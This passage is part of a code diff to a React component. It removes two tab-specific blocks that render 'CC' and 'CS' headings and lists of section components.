-          <h2 style={{ fontFamily: "monospace", fontSize: "28px", marginBottom: "24px" }}>CC</h2>
-          {CC_SECTIONS.map((s, i) => (
-            <CCSection key={s.id} section={s} idx={i} />
-          ))}
-        </div>
-      )}
-
-      {tab === "cs" && (
-        <div>
-          <h2 style={{ fontFamily: "monospace", fontSize: "28px", marginBottom: "24px" }}>CS</h2>
-          {CS_SECTIONS.map((s, i) => (
-            <CSSection key={s.id} section={s} idx={i} />
-          ))}
-        </div>
-      )}
     </div>
   );
 }
